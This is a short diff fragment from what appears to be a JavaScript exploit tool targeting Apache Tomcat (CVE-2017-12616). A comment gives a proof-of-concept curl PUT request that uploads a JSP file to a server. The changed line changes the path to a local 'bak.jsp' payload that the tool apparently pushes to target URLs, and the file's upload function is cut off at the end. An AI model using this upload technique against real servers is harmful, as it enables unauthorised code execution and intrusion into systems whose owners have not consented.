@@ -678,7 +678,7 @@ CVE-2017-12616 poc
 curl -X PUT "http://127.0.0.1:8080/123.jsp/" -d '<%out.println("test");%>'
 http://127.0.0.1:8080/123.jsp
 */
-var szCode = fs.readFileSync(__dirname + "/bak.jsp").toString();
+var szCode = fs.readFileSync(__dirname + "/jars/bak.jsp").toString();
 function fnMyPut(url)
 {
 	var szOld = url.substr(0, url.indexOf("/",10));
